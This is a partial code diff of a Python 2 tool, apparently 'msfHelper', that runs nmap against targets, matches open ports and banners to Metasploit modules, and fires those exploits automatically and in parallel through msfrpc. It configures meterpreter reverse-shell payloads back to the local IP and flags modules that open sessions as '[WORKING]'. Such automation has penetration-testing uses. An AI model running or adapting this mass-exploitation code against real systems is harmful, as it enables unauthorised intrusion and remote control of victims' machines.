+   	  tmpserviceBannerList=sorted(tmpserviceBannerList,key=lambda x: x[1], reverse=True)
+   	  print tabulate(tmpserviceBannerList)
+	  
+	  msfMatchDict={}
+	  for x in hostPortList:
+  	   for y in msfCSVList:
+            moduleCategory=y[1]
+            moduleName=y[2]
+    	    if str(x[1])==y[0]:
+             hostNo=x[0]
+	     portNo=x[1]
+             if portNo not in tmpDict1:
+	      tmpListx=[]
+	      tmpListx.append(moduleCategory+"/"+moduleName)
+	      tmpListy=[]
+	      tmpListy.append(hostNo+":"+str(portNo))
+	      tmpDict1[portNo]=[tmpListx,tmpListy]
+             else:
+	      [tmpListx,tmpListy]=tmpDict1[portNo]
+	      if moduleCategory+"/"+moduleName not in tmpListx:
+	       tmpListx.append(moduleCategory+"/"+moduleName)
+	      if hostNo+":"+str(portNo) not in tmpListy:
+	       tmpListy.append(hostNo+":"+str(portNo))
+	      tmpDict1[portNo]=[tmpListx,tmpListy]
+
+         tmpList3=[]
+	 for key, value in tmpDict1.iteritems():
+          tmpList3.append(["\n".join(value[1]),"\n".join(value[0])])
+         print "\n"+(setColor("[Matching Ports with Metasploit]", bold, color="red"))
+         print tabulate(tmpList3,headers=["Targets","Metasploit Module"],tablefmt="grid")
+
 
 	 #Displaying the list of modules to be run against the target automatically
          tmpList=[]
@@ -1249,6 +1524,7 @@ def runPortBasedModules():
 	   moduleName=x[3]
 	   moduleParameters=x[4]
            moduleDescription=x[5]
+
 	   if filterModuleName(moduleName)==True:
             if str(portNo)!="80":
              if intelligentMode==True:
@@ -1257,8 +1533,23 @@ def runPortBasedModules():
                  if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                   if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                    tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
-                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
-                    autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
+		   tmpFoundOSName=''
+		   for y in osList:
+		    tmpHostNo=y[0]
+		    tmpOSName=(y[1]).lower()
+		    if hostNo==tmpHostNo:
+			tmpFoundOSName=tmpOSName
+		    if len(tmpFoundOSName)>0:
+		     if "windows" in (moduleName).lower() or "linux" in (moduleName).lower():
+ 	              if tmpFoundOSName in (moduleName).lower():
+                       if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
+                        autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
+		     else:
+                      if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
+                       autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
+	            else:
+                     if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
+                      autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                  else:
                   if len(osList)>0:
                    for y in osList:
@@ -1320,9 +1611,24 @@ def runPortBasedModules():
                        if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
                         autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
              else:
-              tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
-              if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
-               autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
+              if len(osList)>0:
+               for y in osList:
+                if y[0] in hostNo:
+                 osType=y[1]
+		 if "linux" in moduleName or "windows" in moduleName or "solaris" in moduleName or "freebsd" in moduleName or "osx" in moduleName or "netware" in moduleName:
+      	          if osType in moduleName:
+                   if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
+                    tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
+                   if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
+                    autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
+		 else:
+                  if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
+                   tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
+                  if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
+                   autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
+              #tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
+              #if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
+              # autoExpListExp.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
 
 	 #Testing auxiliary modules
 	 if len(autoExpListAux)>0:
@@ -1343,6 +1649,17 @@ def runPortBasedModules():
                  if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
                   if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
                    tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
+                   if portNo not in tmpDict1:
+                    tmpListx=[]
+                    tmpListx.append(moduleCategory+"/"+moduleName)
+                    tmpListy=[]
+                    tmpListy.append(hostNo+":"+portNo)
+                    tmpDict1[portNo]=[tmpListx,tmpListy]
+                   else:
+                    [tmpListx,tmpListy]=tmpDict1[portNo]
+                    tmpListx.append(moduleCategory+"/"+moduleName)
+                    tmpListy.append(hostNo+":"+portNo)
+                    tmpDict1[portNo]=[tmpListx,tmpListy]
                    if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                     autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
                  else:
@@ -1406,21 +1723,13 @@ def runPortBasedModules():
                        if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                         autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
              else:
-              tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
+              if [hostNo+":"+portNo,moduleCategory,moduleName] not in tmpList:
+               tmpList.append([hostNo+":"+portNo,moduleCategory,moduleName])
               if [hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription] not in autoExpListAux:
                autoExpListAux.append([hostNo+":"+portNo,moduleCategory,moduleName,moduleParameters,moduleDescription])
 
-         if len(tmpList)>0:
-          print tabulate(tmpList, headers=["Host","Category","Metasploit Module"])
- 	 else:
-	  print "No results found"
-
-
   	 #Running the list of 'automated' moduels against target
 	 #Running 'exploit' modules
-         if len(autoExpListExp)>0 or len(autoExpListAux)>0:
- 	  print "\n**** Test Results from Metasploit Modules ****"
-          print "Please wait ..."
 	 if len(autoExpListExp)>0 and showOnly==False:
 	  tmpList1=[]
 	  maxCount=numOfThreads
@@ -1454,17 +1763,14 @@ def runPortBasedModules():
  	   if filterModuleName(moduleName)==True:
             if str(portNo)!="80":
   	     tmpList1.append([hostNo+":"+str(portNo),moduleCategory+"/"+moduleName,startCount])
-             #tmpChunkList.append([hostNo,moduleName,startCount])
              if startCount==maxCount-1:
               startCount=0
              else:
               startCount+=1
 	  runMultipleAuxExploits(tmpList1)
+         if len(manualExpList)>0 and showOnly==False:
+    	  print "\n"+(setColor("[List of Modules to Run Manually]", bold, color="red"))
 
-         if len(manualExpList)>0:
-	  message="\n**** List of Modules to Run Manually ****"
-  	  #message="\nOther possible Metasploit modules.  Please run the modules manually due to additional inputs required"
-	  print(setColor(message, bold, color="red"))
 	  if intelligentMode==True:
            tmpManualExpList=[]
            for x in manualExpList:
@@ -1473,6 +1779,7 @@ def runPortBasedModules():
             moduleType=x[2]
             moduleName=x[3]
             moduleParameters=x[4]
+            
             if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
 	     if [hostNo+":"+portNo,moduleType,moduleName,moduleParameters] not in tmpManualExpList:
               tmpManualExpList.append([hostNo+":"+portNo,moduleType,moduleName,moduleParameters])
@@ -1484,16 +1791,49 @@ def runPortBasedModules():
                 if osType in moduleName:
                  if [hostNo+":"+portNo,moduleType,moduleName,moduleParameters] not in tmpManualExpList:
                   tmpManualExpList.append([hostNo+":"+portNo,moduleType,moduleName,moduleParameters])
+
+
            if len(tmpManualExpList)>0:
       	    print tabulate(tmpManualExpList, headers=["Host","Type","Module","Parameters"])
            else:
  	    print "No results found"
           else:
            tmpManualExpList=[]
+           tmpDict2={}
            for x in manualExpList:
+            hostNo=x[0]
+	    portNo=x[1]
+            moduleType=x[2]
+            moduleName=x[3]
+            moduleParameters=x[4]
             tmpManualExpList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
-    	   if len(tmpManualExpList)>0:
-            print tabulate(tmpManualExpList, headers=["Host","Module","Parameters"])
+
+ 	    if int(portNo) not in excludePortList:
+             if portNo not in tmpDict2:
+  	      tmpListx=[]
+ 	      tmpListx.append([moduleCategory+"/"+moduleName,moduleParameters])
+ 	      tmpListy=[]
+	      tmpListy.append(hostNo+":"+str(portNo))
+	      tmpDict2[portNo]=[tmpListx,tmpListy]
+             else:
+	      [tmpListx,tmpListy]=tmpDict2[portNo]
+	      if [moduleCategory+"/"+moduleName,moduleParameters] not in tmpListx:
+	       tmpListx.append([moduleCategory+"/"+moduleName,moduleParameters])
+	      if hostNo+":"+str(portNo) not in tmpListy:
+	       tmpListy.append(hostNo+":"+str(portNo))
+	      tmpDict2[portNo]=[tmpListx,tmpListy]
+ 	      
+   	   if len(tmpManualExpList)>0:
+            tmpList4=[]
+	    for key, value in tmpDict2.iteritems():
+             tmpList5=[]
+             tmpList6=[]
+             for y in value[0]:
+              tmpList5.append(y[0])
+              tmpList6.append(y[1])
+             tmpList4.append(["\n".join(value[1]),"\n".join(tmpList5),"\n".join(tmpList6)])
+
+            print tabulate(tmpList4,headers=["Targets","Metasploit Module","Module Parameters"],tablefmt="grid")
            else:
  	    print "No results found"
 	  tmpList=[]
@@ -1501,6 +1841,7 @@ def runPortBasedModules():
 
 def runAuxModule1(input):
  global catchDupSessionList
+ global shellNoticeList
  host=input[0][0]
  hostNo=host.split(":")[0]
  portNo=host.split(":")[1]
@@ -1531,24 +1872,25 @@ def runAuxModule1(input):
    opts['ssl']=False
    client2 = msfrpc.Msfrpc(opts)
    client2.login('msf', mypassword)
-   #res1 = client2.call("console.list")
-   #print res1
    res2 = client2.call('console.create')
    console_id = res2['id']
    payloadStr=''
    payloadList=[]
-   #moduleOptions=client2.call('module.options',["exploit",moduleName])
-   #for key, value in moduleOptions.iteritems()
-   # print key+"\t"+str(value)
 
    if "auxiliary" not in moduleName:
     tmpPayloadList=client2.call('module.compatible_payloads',[moduleName])
+
     watchList=[]
     watchList.append("linux/x86/meterpreter/reverse_tcp")
     watchList.append("php/meterpreter_reverse_tcp")
     watchList.append("python/meterpreter_reverse_https")
     watchList.append("java/meterpreter/reverse_https")
     watchList.append("windows/meterpreter/reverse_https")
+    tmpPayloadFoundStatus=False
+    for x in watchList:
+     if x in tmpPayloadList:   
+      tmpPayloadFoundStatus=True 
+
     payloadList=[]
     for y in tmpPayloadList['payloads']:
      payloadStr=''
@@ -1556,12 +1898,13 @@ def runAuxModule1(input):
       if z==y:
        payloadStr=z
        randomLPort=str(random.randint(40000,50000))
-       #payloadStr='set payload '+payloadStr+'\n set LHOST '+localIP+'\n set LPORT '+str(randomLPort+'\n set VERBOSE true')
        payloadStr='set payload '+payloadStr+'\n set LHOST '+localIP+'\n set LPORT '+str(randomLPort+'\n set CPORT '+str(randomCPort)+' \n set VERBOSE false')
        payloadList.append(payloadStr)
    cmdStr=''
    if len(payloadList)<1:
     payloadList.append('set LHOST '+localIP+'\n set LPORT '+str(randomLPort)+'\n set CPORT '+str(randomCPort)+' \n set VERBOSE false')
+   #print (setColor("[+] Running: "+moduleName+" - "+RHOST+":"+portNo,  color="green"))
+   print "[+] Running: "+moduleName+" - "+RHOST+":"+portNo
    for payloadStr in payloadList:
     randomSrvPort=str(random.randint(10000,30000))
     commands = """use """+moduleName+"""
@@ -1577,25 +1920,41 @@ def runAuxModule1(input):
    startTime = time.time()
    taskComplete=False
    while taskComplete==False:
+    time.sleep(30)
     res2 = client2.call('console.read',[console_id])
     if len(res2['data']) > 1:
      results+=res2['data']
     if res2['busy'] == True:
      if quickMode==True:
       taskComplete=True
-    #if (nowTime-startTime)>15:
-    #if (nowTime-startTime)>80:
+    else:
+     taskComplete=True
     nowTime = time.time()
     if (nowTime-startTime)>15:
+     results+=res2['data']
      taskComplete=True
    if quickMode==False:
-    #client2.call('console.session_kill',[console_id])
-    client2.call('console.destroy',[console_id])
+     client2.call('console.destroy',[console_id])
    complete=True
   except Exception as e:
-   #print "Retrying: "+moduleName
-   #print "error999: "+str(e)
+   #print e
    pass
+  if verbose==True:
+   tmpResults=results.split("\n")
+   #if len(tmpResults)>0:
+   # print "\n"
+   tmpResults1=[]
+   for x in tmpResults:
+    if "[+]" in x or "[-]" in x or "[*]" in x: 
+     if ("[*] Command shell session" not in x and "[*] Meterpreter session" not in x) and "opened" not in x:
+      if x not in tmpResults1:
+       print "["+moduleName+"] "+x
+       tmpResults1.append(x)
+     else:
+      if x not in shellNoticeList:
+       print (setColor(x, color="red"))
+       shellNoticeList.append(x)
+   print "\n"
   return [hostNo+":"+portNo,moduleName,results,[randomCPort,randomLPort,randomSrvPort]]
 
 def runMultipleAuxExploits(tmpList):
@@ -1607,28 +1966,42 @@ def runMultipleAuxExploits(tmpList):
     for chunkList in splitUrlList:
      p = multiprocessing.Pool(numOfThreads)
      tmpChunkList=[]
+
      for y in chunkList:
       hostNo=y[0]
       moduleName=y[1]
       if "linux" not in moduleName.lower() and "unix" not in moduleName.lower() and "windows" not in moduleName.lower() and "osx" not in moduleName.lower() and "solaris" not in moduleName.lower():
-       tmpChunkList.append(y)
+       if [moduleName,hostNo] not in alrTestedModuleList:
+        if len(msfCategory)>0:
+ 	 if msfCategory in moduleName:
+          tmpChunkList.append(y)
+          alrTestedModuleList.append([moduleName,hostNo])
+        else:
+          tmpChunkList.append(y)
+          alrTestedModuleList.append([moduleName,hostNo])
       else:
        if len(osList)>0:
         for x in osList:
          if x[0] in hostNo:
           osType=x[1]
    	  if osType in moduleName:
-           tmpChunkList.append([hostNo,moduleName,startCount])
-	   if startCount==maxCount-1:
-	    startCount=0
-           else:
-            startCount+=1
+ 	   if [moduleName,hostNo] not in alrTestedModuleList:
+            if len(msfCategory)>0 and msfCategory in moduleName:
+             tmpChunkList.append([hostNo,moduleName,startCount])
+             alrTestedModuleList.append([moduleName,hostNo])
+     	     if startCount==maxCount-1:
+	      startCount=0
+             else:
+              startCount+=1
        else:
-        tmpChunkList.append([hostNo,moduleName,startCount])
-	if startCount==maxCount-1:
-	 startCount=0
-        else:
-         startCount+=1
+        if [moduleName,hostNo] not in alrTestedModuleList:
+         if len(msfCategory)>0 and msfCategory in moduleName:
+          tmpChunkList.append([hostNo,moduleName,startCount])
+          alrTestedModuleList.append([moduleName,hostNo])
+     	  if startCount==maxCount-1:
+	   startCount=0
+          else:
+           startCount+=1
      tmpResultList = p.map(runAuxModule1,itertools.izip(tmpChunkList))
      tmpResultList1=[]
      p.close()
@@ -1636,13 +2009,15 @@ def runMultipleAuxExploits(tmpList):
      p.terminate()
      count=0
      totalCount=len(chunkList)
+     #print "\n"
      for z in tmpResultList:
       tmpList=[]
       tmpList1=[]
       tmpList2=[]
       hostNo=z[0]
-      moduleName=z[1]
-      tmpList.append([hostNo,moduleName])
+      tmpmoduleName=z[1]
+      if [hostNo,tmpmoduleName] not in tmpList:
+       tmpList.append([hostNo,tmpmoduleName])
 
       moduleResults=z[2]
       cPort=z[3][0]
@@ -1657,15 +2032,17 @@ def runMultipleAuxExploits(tmpList):
       for x in moduleResultsList:
        x=escape_ansi(x)
        if "[*]" in x or "[-]" in x or "[+]" in x:
-        if x not in tmpList1:
-         tmpList1.append(x)
+	if "Failed to load module" not in x and "A maximum of one thread" not in x and "Thread count has been adjusted" not in x:
+         if x not in tmpList1:
+          tmpList1.append(x)
        count+=1
       if len(tmpList1)>0:
+       if "A is input..." in str(tmpList1):
+        exploitOK=True
        if "LOGIN SUCCESSFUL" in str(tmpList1):
         exploitOK=True
        for y in tmpList1:
         if "Command shell session" in y or "Meterpreter session" in y:
-         #print "here: "+str(cPort)+"\t"+str(sPort)+"\t"+str(lPort)
          if ":"+str(cPort) in str(y):
   	  exploitOK=True
          if ":"+str(sPort) in str(y):
@@ -1677,41 +2054,45 @@ def runMultipleAuxExploits(tmpList):
         else:
           tmpList2.append(y)
 
+
        if exploitOK==True:
-        if "auxiliary" in moduleName:
+        if "auxiliary" in tmpmoduleName:
           if exploitOK==True:
-           print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
+           print setColor('[WORKING] ', bold, color="red")+tabulate(tmpList, tablefmt="plain")
            if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
       	    workingExploitList.append([tmpList[0][0],tmpList[0][1]])
-          else:
-           print tabulate(tmpList, tablefmt="plain")+" "+setColor('', bold, color="blue")
+          #else:
+	  # print "d"
+          # print tabulate(tmpList, tablefmt="plain")+" "+setColor('', bold, color="blue")
         else:
-         print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
+         print setColor('[WORKING] ', bold, color="red")+tabulate(tmpList, tablefmt="plain")
          if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
  	  workingExploitList.append([tmpList[0][0],tmpList[0][1]])
         if verbose==True:
          for y in tmpList1:
           print y
-         print "\n"
 
        else:
         if quickMode==False:
-         if "auxiliary" in moduleName:
+         if "auxiliary" in tmpmoduleName:
           if exploitOK==True:
-           print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
+           print setColor('[WORKING] ', bold, color="red")+tabulate(tmpList, tablefmt="plain")
            if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
     	    workingExploitList.append([tmpList[0][0],tmpList[0][1]])
-          else:
-           print tabulate(tmpList, tablefmt="plain")+" "+setColor('', bold, color="red")
-         else:
-          print tabulate(tmpList, tablefmt="plain")+" "+setColor('[FAILED]', bold, color="red")
+          #else:
+          # print "d"
+          # print tabulate(tmpList, tablefmt="plain")+" "+setColor('', bold, color="red")
+         #else:
+         # print tabulate(tmpList, tablefmt="plain")+" "+setColor('[FAILED]', bold, color="red")
         else:
          print tabulate(tmpList, tablefmt="plain")+" "+setColor('[Check Msfconsole]', bold, color="red")
         if verbose==True:
+         #if len(tmpList2)>0:
+         # print "\n"
          for y in tmpList2:
-          print y
+          print "["+moduleName+"] "+y
          print "\n"
-
+     #print "\n"
 
 def runMsfExploitsAndDisplayreport(tmpPathResultList):
      	p = multiprocessing.Pool(numOfThreads)
@@ -1728,7 +2109,8 @@ def runMsfExploitsAndDisplayreport(tmpPathResultList):
      	 tmpList2=[]
      	 hostNo=z[0]
      	 moduleName=z[1]
-     	 tmpList.append([hostNo,moduleName])
+     	 if [hostNo,moduleName] not in tmpList:
+       	  tmpList.append([hostNo,moduleName])
 
      	 moduleResults=z[2]
          cPort=z[3][0]
@@ -1765,24 +2147,24 @@ def runMsfExploitsAndDisplayreport(tmpPathResultList):
             tmpList2.append(y)
 
          if exploitOK==True:
-          print tabulate(tmpList, tablefmt="plain")+" "+setColor('[OK]', bold, color="blue")
+          print setColor('[WORKING] ', bold, color="red")+tabulate(tmpList, tablefmt="plain")
           if [tmpList[0][0],tmpList[0][1]] not in workingExploitList:
   	   workingExploitList.append([tmpList[0][0],tmpList[0][1]])
        	  if verbose==True:
            if len(tmpList2)>0:
             for y in tmpList2:
              print y
-            print "\n"
+            #print "\n"
      	 else:
-           if quickMode==False:
-            print tabulate(tmpList, tablefmt="plain")+" "+setColor('[FAILED]', bold, color="red")
-           else:
+           if quickMode==True:
+            #print tabulate(tmpList, tablefmt="plain")+" "+setColor('[FAILED]', bold, color="red")
+            #else:
             print tabulate(tmpList, tablefmt="plain")+" "+setColor('[Check Msfconsole]', bold, color="red")
        	   if verbose==True:
             if len(tmpList2)>0:
              for y in tmpList2:
               print y
-             print "\n"
+             #print "\n"
 
 
 def createDB():
@@ -1820,7 +2202,8 @@ def displayPortInfo(tmpList1):
     try:
      portNo,portName,portDesc=extractPortInfo([x[0],x[1]])
      if portName==None and portDesc==None:
-       tmpList.append([x[0]+"/"+x[1],"",""])
+       if [x[0]+"/"+x[1],"",""] not in tmpList:
+        tmpList.append([x[0]+"/"+x[1],"",""])
      if len(portNo)>0 and len(portName)>0 and len(portDesc)>0:
       if [portNo,portName,portDesc[0:80]] not in tmpList:
        tmpList.append([portNo,portName,portDesc[0:80]])
@@ -1833,11 +2216,14 @@ def displayPortInfo(tmpList1):
 def runMain():
  global autoExpListExp
  global autoExpListAux
-
+ global tmpModuleList
+ global msfCSVList
  try:
 	vulnURLList=[]
 	tmpModuleList1=[]
-	tmpModuleList=pullMSF()
+  	if len(tmpModuleList)<1:
+ 	 tmpModuleList=pullMSF()
+ 	msfCSVList=readMsfhelperCSV()
 	tmpModuleList2=tmpModuleList
 	for x in tmpModuleList:
 	 module = x[1]
@@ -1858,13 +2244,14 @@ def runMain():
          targetList.append(x)
 
 	runPortBasedModules()
-	runServiceBasedModules()
+	if intelligentMode==True:
+ 	 runServiceBasedModules()
 
 	print "\n"
-        print "[*] "+str(len(httpList))+" HTTP servers detected"
-        print "[*] "+str(len(httpsList))+" HTTPs servers detected"
-
-	if len(httpList)>0:
+        print "[*] "+str(len(httpList))+" HTTP servers found"
+        print "[*] "+str(len(httpsList))+" HTTPs servers found"
+  	'''
+ 	if len(httpList)>0:
  	 print "\n[*] List of HTTP Servers"
 	 for x in httpList:
 		print x[0]+":"+x[1]
@@ -1872,25 +2259,27 @@ def runMain():
 	 print "\n[*] List of HTTPs Servers"
 	 for x in httpsList:
 		print x[0]+":"+x[1]
+  	'''
+        if showOnly==False:
+ 	 runWebBasedModules()
+	 #runExploitDBModules()
 
-	runWebBasedModules()
-	runExploitDBModules()
-
- 	message="\n**** List of Working Metasploit Modules ****"
-	print(setColor(message, bold, color="red"))
-	if len(workingExploitList)>0:
- 	 print tabulate(workingExploitList, headers=["Host","Module"])
-        else:
-         print "No results found"
-        print "\n"
-	killMSF()
-        if len(nmapFilename)>0:
-         print "Nmap file saved as: "+nmapFilename+".nmap"
-	killMSF()
+	 print "\n"+(setColor("[List of Matching Metasploit Modules]", bold, color="red"))
+	 if len(workingExploitList)>0:
+ 	  print tabulate(workingExploitList, headers=["Host","Module"])
+   	 else:
+    	  print "No results found"
+   	  print "\n"
+	 killMSF()
+   	 if len(nmapFilename)>0:
+    	  print "Nmap file saved as: "+nmapFilename+".nmap"
+	  killMSF()
  except KeyboardInterrupt:
 	killMSF()
 
 def readDB():
+ global allPathModuleList
+ global allPathList
  conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
  conn.text_factory = str
  cur=conn.execute("SELECT portNo, moduleType, moduleName, moduleParameters, moduleDescription from portList")
@@ -1938,12 +2327,14 @@ def readExploitDB():
  return tmpResultlist
 
 def runNmap(targetIP):
- print setColor('[*] Running Nmap against target: '+targetIP, bold, color="red")
+ #print setColor('[*] Running Nmap against target: '+targetIP, bold, color="red")
+ print "\n[*] Running nmap against target: "+targetIP
  portStr=''
  count=0
  #if len(allPortList):
  # print "[!] Please run msfHelper.py -u beforec continuing"
  # sys.exit()
+
  if portsInput!="":
   portStr=portsInput
  else:
@@ -1955,14 +2346,19 @@ def runNmap(targetIP):
  basename = "nmap_"
  suffix = datetime.datetime.now().strftime("%y%m%d_%H%M%S")
  filename = "_".join([basename, suffix])
- nmapFilename=filename
- cmd=''
- if scanAll==True:
-  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV --top-ports 65535 "+targetIP+" -oA "+filename
+ nmapFilename=""
+ if len(outputDirectory)>0:
+  nmapFilename=outputDirectory+filename
  else:
-  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV -p "+portStr+" "+targetIP+" -oA "+filename
+  nmapFilename=filename
+ cmd=''
+ if len(portStr)<1:
+  #if scanAll==True:
+  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV --top-ports 65535 "+targetIP+" -oA "+nmapFilename
+ else:
+  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV -p "+portStr+" "+targetIP+" -oA "+nmapFilename
  os.system(cmd)
- return filename
+ return nmapFilename
 
 def runNmapList(inputFilename):
  print setColor("[*] Running Nmap against targets", bold, color="red")
@@ -1979,11 +2375,17 @@ def runNmapList(inputFilename):
  basename = "nmap_"
  suffix = datetime.datetime.now().strftime("%y%m%d_%H%M%S")
  filename = "_".join([basename, suffix])
- cmd=''
- if scanAll==True:
-  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV --top-ports 65535 -iL "+inputFilename+" -oA "+filename
+ nmapFilename=""
+ if len(outputDirectory)>0:
+  nmapFilename=outputDirectory+filename
  else:
-  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV -p "+portStr+" -iL "+inputFilename+" -oA "+filename
+  nmapFilename=filename
+ cmd=''
+ if len(portStr)<1:
+  #if scanAll==True:
+  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV --top-ports 65535 -iL "+inputFilename+" -oA "+nmapFilename
+ else:
+  cmd = "nmap -O --max-retries 3 -T4 -n -Pn --open -sT -sV -p "+portStr+" -iL "+inputFilename+" -oA "+nmapFilename
  os.system(cmd)
  return filename
 
@@ -2025,6 +2427,7 @@ parser = argparse.ArgumentParser(
 parser.add_argument("target", nargs='*', type=str, help="The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets")
 parser.add_argument("-P", type=str, dest="mypassword", help="Password to connect to msfrpc")
 parser.add_argument("-p", type=str, dest="portsInput", help="Only scan specific TCP ports")
+parser.add_argument("-o", type=str, dest="outputDirectory", help="Location to save portList.csv, pathList.csv, nmap scan results")
 parser.add_argument("-i", action='store_true', help="Intelligent mode (Match the Nmap service banner with the Metasploit modules")
 parser.add_argument("-m", "--manual", action='store_true', help="Manually start up Msfconsole and 'load msgrpc Pass=xxxx'")
 parser.add_argument("-a", "--scanall", action='store_true', help="Scan all 65535 TCP ports")
@@ -2035,20 +2438,31 @@ parser.add_argument("-gt", type=str, dest="greaterthan", help="Only scan TCP por
 parser.add_argument("--info", action='store_true', help="Lookup information about ports online")
 parser.add_argument("-v", "--verbose", action='store_true', help="Verbose mode")
 parser.add_argument("-s", "--showonly", action='store_true', help="Show matching Metasploit modules but don't run")
+parser.add_argument("-t", type=str, dest="category", help="Choose between 'exploit' or 'auxiliary'")
 cgroup = parser.add_argument_group("Whether to run Metasploit 'services', 'ports', 'web' modules or 'exploitdb'", "Options for executing commands")
-cgroup.add_argument("-e", "--exec-method", choices={"all", "services", "ports", "web", "exploitdb"}, default="all", help="")
+cgroup.add_argument("-e", "--exec-method", choices={"all", "services", "ports", "web"}, default="all", help="")
 if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
 args = parser.parse_args()
 if args.greaterthan:
 	greatthanPorts=int(args.greaterthan)
-if not os.path.exists("/usr/share/metasploit-framework"):
- print "[!] Metasploit Framework cannot be found at the location /usr/share/metasploit-framework"
+if not os.path.exists(msfPath):
+ print "[!] Metasploit Framework cannot be found at the location "+msfPath
  sys.exit()
-
+if args.outputDirectory:
+ if not os.path.exists(args.outputDirectory):
+  os.mkdir(args.outputDirectory)
+ outputDirectory=args.outputDirectory
+ if not outputDirectory.endswith("/"):
+  outputDirectory+="/"
 #testMsfConnection()
 localIP=get_ip_address()
+if args.category:
+ if args.category!='exploit' and args.category!='auxiliary':
+  print "[!] Please select a category 'exploit' or 'auxiliary'"
+  sys.exit()
+ msfCategory=args.category
 if args.info:
  portInfo=True
 if args.i:
@@ -2082,28 +2496,30 @@ if manualStart==False:
 if not os.path.exists(os.getcwd()+"/msfHelper.db"):
  createDB()
  blankDB=True
- print "[*] Running msfupdate"
- updateMSF()
+ #print "[*] Running msfupdate"
+ #updateMSF()
 
 #tmpModuleList=pullMSF()
+readDB()
 if args.update:
   print "[*] Running msfupdate"
-  updateMSF()
-  if blankDB!=True:
-   tmpModuleList=pullMSF()
-   updateDB(tmpModuleList)
+  #updateMSF()
+  #if blankDB!=True:
+  tmpModuleList=pullMSF()
+  updateDB(tmpModuleList)
 
-if len(args.target)<1:
- print "[!] Please set a target"
- sys.exit()
+if len(args.target)<1: 
+   print "[!] Please set a target."
+   sys.exit()
 
-if blankDB==True:
- tmpModuleList=pullMSF()
- updateDB(tmpModuleList)
+#if blankDB==True:
+# tmpModuleList=pullMSF()
+# updateDB(tmpModuleList)
 
 #Read sqlite3 file for data obtained from Metasploit
 print "[*] Reading from msfHelper.db"
 readDB()
+print "[*] Loaded "+str(len(allPathList))+" URI paths from msfHelper.db"
 
 for target in args.target:
  if os.path.exists(target):
@@ -2151,7 +2567,6 @@ for target in args.target:
    print setColor('[*] Error encountered!', bold, color="red")
    print "[!] No open ports found.  Please check your target IPs"
    sys.exit()
-
 while isOpen(msfIP,msfPort)==False:
  time.sleep(1)
 if args.quick:
